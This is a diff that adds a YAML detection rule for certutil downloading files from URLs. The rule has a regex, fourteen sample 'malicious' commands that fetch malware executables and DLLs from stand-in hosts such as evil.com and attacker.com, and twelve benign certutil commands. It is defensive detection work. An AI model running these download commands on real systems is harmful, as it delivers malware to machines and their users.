@@ -1,0 +1,37 @@
+name: high-07-certutil
+severity: high
+description: >
+  Detects certutil downloading files from URLs. Legitimate certificate tool frequently abused for malware delivery.
+
+pattern: |
+  (?i)certutil.*-url(cache)?.*(http|ftp)s?://
+
+malicious:
+  - "certutil -urlcache -f http://evil.com/malware.exe C:\\malware.exe"
+  - "certutil.exe -urlcache -split -f https://attacker.com/payload.dll payload.dll"
+  - "certutil -url http://malware.com/backdoor.exe backdoor.exe"
+  - "CERTUTIL -URLCACHE -F http://evil.com/dropper.exe dropper.exe"
+  - "certutil.exe -urlcache https://bad.com/trojan.dll C:\\Windows\\Temp\\trojan.dll"
+  - "certutil -urlcache -split -f ftp://evil.com/malware.exe mal.exe"
+  - "certutil -f -split -urlcache http://attacker.com/evil.dll"
+  - 'certutil.exe -urlcache -f "http://evil.com/clickfix.exe" clickfix.exe'
+  - "certutil -urlcache http://malware.com/payload.exe C:\\Temp\\payload.exe"
+  - "certutil.exe -url -f https://evil.com/backdoor.dll backdoor.dll"
+  - "certutil -urlcache -f http://192.168.1.100/malware.bin malware.bin"
+  - "cmd /c certutil -urlcache -f http://evil.com/stage2.dll stage2.dll"
+  - "certutil.exe -f -urlcache https://evil.com/implant.exe implant.exe"
+  - "certutil -url https://malware.com/loader.dll -f loader.dll"
+
+benign:
+  - "certutil -hashfile file.exe SHA256"
+  - "certutil -verify certificate.cer"
+  - "certutil.exe -store My"
+  - "certutil -viewstore Root"
+  - "certutil -dump certificate.pfx"
+  - 'certutil.exe -addstore -f "ROOT" certificate.cer'
+  - "certutil -verifyctl"
+  - "certutil -hashfile C:\\Downloads\\installer.msi SHA1"
+  - "certutil.exe -viewdelstore Root serialNumber"
+  - "certutil -repairstore My"
+  - "certutil -delstore CA certificateName"
+  - "certutil -store -user My"
